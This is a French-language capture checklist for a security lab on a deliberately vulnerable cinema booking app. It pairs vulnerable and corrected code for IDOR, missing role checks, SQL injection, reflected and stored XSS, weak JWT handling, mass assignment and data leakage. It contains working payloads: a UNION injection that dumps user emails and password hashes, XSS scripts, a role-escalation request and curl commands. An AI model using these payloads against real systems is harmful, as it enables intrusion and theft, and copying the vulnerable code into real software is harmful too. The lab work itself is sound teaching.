# Captures obligatoires — CinémaBook

Ce document fournit, pour chaque faille significative, les éléments à **capturer** (Burp Suite ou navigateur) pour le rapport final.

Pour chaque vulnérabilité :
- [ ] Capture Burp Suite ou navigateur
- [x] Requête HTTP vulnérable
- [x] Payload utilisé
- [x] Réponse serveur (vulnerable + secure)
- [x] Résultat visible côté application
- [x] Extrait de code vulnérable
- [x] Extrait de code corrigé

> **Branche vulnerable** : `git checkout vulnerable` puis `npm run dev` (backend + frontend).  
> **Branche secure** : pour les captures « après correction ».

Voir aussi [AUDIT.md](AUDIT.md) pour l'analyse complète.

---

## 1. IDOR — Accès aux réservations d'autrui

### Explication attendue

L'utilisateur `user@demo.local` accède à une réservation appartenant à `admin@demo.local`. Le backend récupère la réservation uniquement par son ID sans vérifier le propriétaire.

### Requête HTTP vulnérable

```http
POST /api/auth/login HTTP/1.1
Host: localhost:3001
Content-Type: application/json

{"email":"user@demo.local","password":"password"}
```

Puis :

```http
GET /api/reservations/2 HTTP/1.1
Host: localhost:3001
Authorization: Bearer <token_user>
Accept: application/json
```

> Remplacer `2` par l'ID d'une réservation admin (visible via connexion admin ou après seed).

### Payload utilisé

Modification de l'identifiant dans l'URL : `/api/reservations/2` au lieu de sa propre réservation.

Côté navigateur : `http://localhost:3000/reservations/2`

### Réponse serveur — vulnerable (200 OK)

```json
{
  "id": 2,
  "user_id": 2,
  "user_email": "admin@demo.local",
  "movie_title": "The Last Heist",
  "room_name": "Salle 2",
  "total_price": 8,
  "status": "confirmed",
  "seats": [
    { "row_label": "C", "seat_number": 5, "ticket_type": "etudiant", "price": 8 }
  ]
}
```

### Réponse serveur — secure (403 Forbidden)

```json
{
  "error": "Accès refusé"
}
```

### Résultat visible côté application

| Version | Comportement |
|---------|--------------|
| **vulnerable** | Page `/reservations/2` affiche le film, l'email `admin@demo.local` et les places |
| **secure** | Message d'erreur « Accès refusé » ou page vide avec erreur |

**Capture à réaliser :** navigateur sur `/reservations/[id_autrui]` + onglet Réseau (DevTools) montrant la réponse 200 vs 403.

### Code vulnérable (`vulnerable` — `backend/src/routes/reservations.js`)

```javascript
router.get('/:id', authRequired, (req, res) => {
  const reservation = getReservationDetails(req.params.id);
  if (!reservation) return res.status(404).json({ error: 'Réservation introuvable' });
  res.json(reservation);  // ← pas de vérification user_id
});
```

### Code corrigé (`secure` — `backend/src/routes/reservations.js`)

```javascript
router.get('/:id', authRequired, (req, res) => {
  const reservation = getReservationDetails(req.params.id);
  if (!reservation) return res.status(404).json({ error: 'Réservation introuvable' });

  if (req.user.role !== 'admin' && reservation.user_id !== req.user.id) {
    return res.status(403).json({ error: 'Accès refusé' });
  }

  res.json(reservation);
});
```

---

## 2. BOLA — Panneau admin sans contrôle de rôle

### Explication attendue

Un utilisateur standard accède aux statistiques réservées aux administrateurs. Seule l'authentification est vérifiée, pas le rôle.

### Requête HTTP vulnérable

```http
GET /api/admin/stats HTTP/1.1
Host: localhost:3001
Authorization: Bearer <token_user_standard>
Accept: application/json
```

### Payload utilisé

Aucun payload spécial — simple appel GET avec token d'un compte `user`.

### Réponse serveur — vulnerable (200 OK)

```json
{
  "users": 2,
  "movies": 3,
  "reservations": 2,
  "revenue": 32,
  "recent_reservations": [
    {
      "id": 1,
      "total_price": 24,
      "status": "confirmed",
      "email": "user@demo.local",
      "title": "Nebula Rising"
    }
  ]
}
```

### Réponse serveur — secure (403 Forbidden)

```json
{
  "error": "Accès refusé"
}
```

### Résultat visible côté application

| Version | Comportement |
|---------|--------------|
| **vulnerable** | `/admin` affiche revenus et tableau des réservations |
| **secure** | Message « Accès refusé » ; lien Admin masqué dans la nav pour les users |

**Capture à réaliser :** page `/admin` connecté en `user@demo.local` (vulnerable) vs erreur 403 (secure).

### Code vulnérable (`backend/src/routes/admin.js`)

```javascript
router.get('/stats', authRequired, (req, res) => {
  // authRequired seulement — pas de adminRequired
  const stats = { users: ..., revenue: ..., recent_reservations: [...] };
  res.json(stats);
});
```

### Code corrigé (`secure`)

```javascript
router.get('/stats', authRequired, adminRequired, (req, res) => {
  const stats = { ... };
  res.json(stats);
});
```

---

## 3. Injection SQL — Recherche de films

### Explication attendue

Le paramètre `q` est injecté directement dans la requête SQL, permettant une attaque UNION pour lire la table `users`.

### Requête HTTP vulnérable

```http
GET /api/movies/search?q='%20UNION%20SELECT%20id,email,password,role,bio%20FROM%20users-- HTTP/1.1
Host: localhost:3001
Accept: application/json
```

### Payload utilisé

```
' UNION SELECT id,email,password,role,bio FROM users--
```

### Réponse serveur — vulnerable (200 OK)

```json
{
  "query": "SELECT * FROM movies WHERE title LIKE '%' UNION SELECT id,email,password,role,bio FROM users--%' OR synopsis LIKE '%' UNION SELECT id,email,password,role,bio FROM users--%'",
  "movies": [
    {
      "id": 1,
      "title": "user@demo.local",
      "synopsis": "$2a$04$STIOAosrlfi/h...",
      "duration": "user",
      "poster_url": "Amateur de science-fiction."
    },
    {
      "id": 2,
      "title": "admin@demo.local",
      "synopsis": "$2a$04$STIOAosrlfi/h...",
      "duration": "admin",
      "poster_url": "Administrateur du cinéma."
    }
  ]
}
```

### Réponse serveur — secure (200 OK — pas de fuite)

```json
{
  "movies": []
}
```

### Résultat visible côté application

| Version | Comportement |
|---------|--------------|
| **vulnerable** | Page `/movies` : résultats de recherche contenant des emails et hash bcrypt ; requête SQL affichée |
| **secure** | Aucun résultat suspect ; pas d'affichage de la requête SQL |

**Capture à réaliser :** Burp Repeater avec le payload UNION + page films montrant les emails dans les résultats.

### Code vulnérable (`backend/src/routes/movies.js`)

```javascript
router.get('/search', (req, res) => {
  const q = req.query.q || '';
  const query = `SELECT * FROM movies WHERE title LIKE '%${q}%' OR synopsis LIKE '%${q}%'`;
  const movies = db.prepare(query).all();
  res.json({ query, movies });
});
```

### Code corrigé (`secure`)

```javascript
router.get('/search', (req, res) => {
  const q = typeof req.query.q === 'string' ? req.query.q.trim().slice(0, 100) : '';
  const pattern = `%${q}%`;
  const movies = db.prepare(
    'SELECT id, title, synopsis, duration, poster_url FROM movies WHERE title LIKE ? OR synopsis LIKE ?'
  ).all(pattern, pattern);
  res.json({ movies });
});
```

---

## 4. XSS réfléchi — Page de connexion

### Explication attendue

L'email saisi est renvoyé dans le message d'erreur puis interprété comme HTML par React (`dangerouslySetInnerHTML`).

### Requête HTTP vulnérable

```http
POST /api/auth/login HTTP/1.1
Host: localhost:3001
Content-Type: application/json

{"email":"<img src=x onerror=alert('XSS')>@test.com","password":"wrong"}
```

### Payload utilisé

```
<img src=x onerror=alert('XSS')>@test.com
```

### Réponse serveur — vulnerable (401)

```json
{
  "error": "Aucun compte trouvé pour l'email : <img src=x onerror=alert('XSS')>@test.com",
  "reflected": "<img src=x onerror=alert('XSS')>@test.com"
}
```

### Réponse serveur — secure (401)

```json
{
  "error": "Identifiants invalides"
}
```

### Résultat visible côté application

| Version | Comportement |
|---------|--------------|
| **vulnerable** | Alerte JavaScript `XSS` à la soumission du formulaire login |
| **secure** | Message texte « Identifiants invalides », pas d'exécution de script |

**Capture à réaliser :** navigateur sur `/login` avec le payload dans le champ email + alerte JS visible.

### Code vulnérable

**Backend** (`routes/auth.js`) :
```javascript
return res.status(401).json({
  error: `Aucun compte trouvé pour l'email : ${email}`,
  reflected: email,
});
```

**Frontend** (`app/login/page.tsx`) :
```tsx
<div className="error" dangerouslySetInnerHTML={{ __html: errorHtml }} />
```

### Code corrigé

**Backend** :
```javascript
return res.status(401).json({ error: 'Identifiants invalides' });
```

**Frontend** :
```tsx
{error && <div className="error">{error}</div>}
```

---

## 5. XSS stocké — Avis sur les films

### Explication attendue

Un avis contenant du JavaScript est stocké en base et exécuté pour tous les visiteurs de la fiche film.

### Requête HTTP vulnérable

```http
POST /api/reviews HTTP/1.1
Host: localhost:3001
Authorization: Bearer <token>
Content-Type: application/json

{"movie_id":1,"content":"<script>alert('XSS stocké')</script>"}
```

### Payload utilisé

```html
<script>alert('XSS stocké')</script>
```

### Réponse serveur — vulnerable (201 Created)

```json
{
  "id": 2,
  "content": "<script>alert('XSS stocké')</script>",
  "author_email": "user@demo.local",
  "created_at": "2026-07-03 10:00:00"
}
```

### Réponse serveur — secure (201 Created)

```json
{
  "id": 2,
  "content": "&lt;script&gt;alert('XSS stocké')&lt;/script&gt;",
  "author_email": "user@demo.local"
}
```

### Résultat visible côté application

| Version | Comportement |
|---------|--------------|
| **vulnerable** | Alerte JS à chaque visite de `/movies/1` |
| **secure** | Texte littéral affiché, pas d'exécution |

**Capture à réaliser :** fiche film après publication de l'avis + alerte visible.

### Code vulnérable

**Backend** : contenu stocké tel quel.

**Frontend** (`movies/[id]/page.tsx`) :
```tsx
<div dangerouslySetInnerHTML={{ __html: r.content }} />
```

### Code corrigé

**Backend** (`utils/sanitize.js` + `routes/reviews.js`) :
```javascript
const content = sanitizeText(req.body.content, 1000);
```

**Frontend** :
```tsx
<div>{r.content}</div>
```

---

## 6. Authentification faible

### Explication attendue

Secret JWT exposé via endpoint debug, pas de rate limiting, expiration longue.

### Requête HTTP vulnérable

```http
GET /api/debug/config HTTP/1.1
Host: localhost:3001
Accept: application/json
```

Brute force (boucle sans limite) :

```http
POST /api/auth/login HTTP/1.1
Host: localhost:3001
Content-Type: application/json

{"email":"admin@demo.local","password":"tentative"}
```

### Payload utilisé

Aucun — énumération de mots de passe ou lecture du secret JWT.

### Réponse serveur — vulnerable (200 OK)

```json
{
  "node_env": "development",
  "jwt_secret": "cinema-secret-key",
  "jwt_expires_in": "30d",
  "db_path": "/path/to/backend/data/cinema.db",
  "debug": true
}
```

### Réponse serveur — secure

```http
HTTP/1.1 404 Not Found
{"error":"Ressource introuvable"}
```

Après 10 tentatives login : `429 Too Many Requests`

### Résultat visible côté application

| Version | Comportement |
|---------|--------------|
| **vulnerable** | `curl /api/debug/config` retourne le secret |
| **secure** | 404 ; login bloqué après 10 essais |

**Capture à réaliser :** réponse JSON du debug endpoint + Burp Intruder montrant l'absence de rate limit (vulnerable).

### Code vulnérable (`middleware/auth.js`)

```javascript
const JWT_SECRET = process.env.JWT_SECRET || 'cinema-secret-key';
const JWT_EXPIRES_IN = '30d';
```

### Code corrigé (`secure`)

```javascript
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET || JWT_SECRET.length < 32) process.exit(1);
const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '1h';
```

+ `loginLimiter` sur `POST /api/auth/login`, endpoint `debug.js` supprimé.

---

## 7. Mass assignment — Rôle admin et prix à 0 €

### Explication attendue

Le serveur accepte des champs sensibles (`role`, `total_price`) envoyés par le client.

### Requête HTTP vulnérable — Élévation de privilège

```http
PATCH /api/users/me HTTP/1.1
Host: localhost:3001
Authorization: Bearer <token_user>
Content-Type: application/json

{"role":"admin"}
```

### Requête HTTP vulnérable — Réservation gratuite

```http
POST /api/reservations HTTP/1.1
Host: localhost:3001
Authorization: Bearer <token_user>
Content-Type: application/json

{
  "showtime_id": 2,
  "seats": [{"seat_id": 10, "ticket_type": "adulte"}],
  "total_price": 0
}
```

### Payload utilisé

```json
{"role":"admin"}
```
```json
{"total_price": 0}
```

### Réponse serveur — vulnerable

```json
{"id": 1, "email": "user@demo.local", "role": "admin", "bio": "..."}
```
```json
{"id": 3, "total_price": 0, "status": "confirmed", "seats": [{"ticket_type": "adulte", "price": 12}]}
```

### Réponse serveur — secure

```json
{"error": "Aucun champ autorisé à mettre à jour"}
```
```json
{"id": 3, "total_price": 12, "status": "confirmed"}
```

### Résultat visible côté application

| Version | Comportement |
|---------|--------------|
| **vulnerable** | User devient admin ; réservation confirmée à 0 € |
| **secure** | Rôle inchangé ; prix recalculé à 12 € |

**Capture à réaliser :** Burp Repeater PATCH avec `role:admin` + réponse JSON.

### Code vulnérable (`routes/users.js`)

```javascript
const allowed = ['email', 'bio', 'role', 'password'];
```

### Code corrigé (`secure`)

```javascript
// Seuls email et bio acceptés explicitement
const { email, bio } = req.body;
```

---

## 8. Misconfiguration — Fuite d'informations

### Explication attendue

Stack traces, hash mot de passe et configuration exposés via l'API.

### Requête HTTP vulnérable

```http
GET /api/users/1 HTTP/1.1
Host: localhost:3001
Authorization: Bearer <token>
```

### Payload utilisé

Aucun — simple GET sur un profil utilisateur.

### Réponse serveur — vulnerable (200 OK)

```json
{
  "id": 1,
  "email": "user@demo.local",
  "role": "user",
  "bio": "...",
  "password": "$2a$04$STIOAosrlfi/h..."
}
```

### Réponse serveur — secure (200 OK — champs limités)

```json
{
  "id": 1,
  "email": "user@demo.local",
  "role": "user",
  "bio": "..."
}
```

Erreur 500 en production (secure) :
```json
{"error": "Erreur interne du serveur"}
```

### Résultat visible côté application

Pas de changement UI direct — preuve via Burp/curl.

**Capture à réaliser :** réponse JSON montrant le champ `password` (vulnerable) vs absent (secure).

### Code vulnérable (`routes/users.js`)

```javascript
const user = db.prepare('SELECT id, email, role, bio, password FROM users WHERE id = ?').get(req.params.id);
```

### Code corrigé (`secure`)

```javascript
const user = db.prepare('SELECT id, email, role, bio FROM users WHERE id = ?').get(targetId);
// + contrôle ownership ou admin
```

---

## Checklist finale du rapport

| # | Faille | Capture nav/Burp | Requête | Payload | Réponse vuln. | Réponse secure | Code vuln. | Code corrigé |
|---|--------|------------------|---------|---------|---------------|----------------|------------|--------------|
| 1 | IDOR | ☐ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| 2 | BOLA | ☐ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| 3 | SQLi | ☐ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| 4 | XSS réfléchi | ☐ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| 5 | XSS stocké | ☐ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| 6 | Auth faible | ☐ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| 7 | Mass assignment | ☐ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| 8 | Misconfiguration | ☐ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |

### Commandes rapides pour générer les preuves

```bash
# Basculer sur vulnerable
git checkout vulnerable
cd backend && npm run dev

# Token user
export TOKEN=$(curl -s -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@demo.local","password":"password"}' | jq -r .token)

# IDOR
curl -s http://localhost:3001/api/reservations/2 -H "Authorization: Bearer $TOKEN" | jq

# SQLi
curl -s "http://localhost:3001/api/movies/search?q='%20UNION%20SELECT%20id,email,password,role,bio%20FROM%20users--" | jq

# Debug
curl -s http://localhost:3001/api/debug/config | jq

# Puis secure pour comparer
git checkout secure
```

### Dossier captures (à créer)

Placez vos screenshots dans :

```
docs/captures/
  01-idor-navigateur.png
  01-idor-burp.png
  02-bola-admin.png
  03-sqli-recherche.png
  ...
```
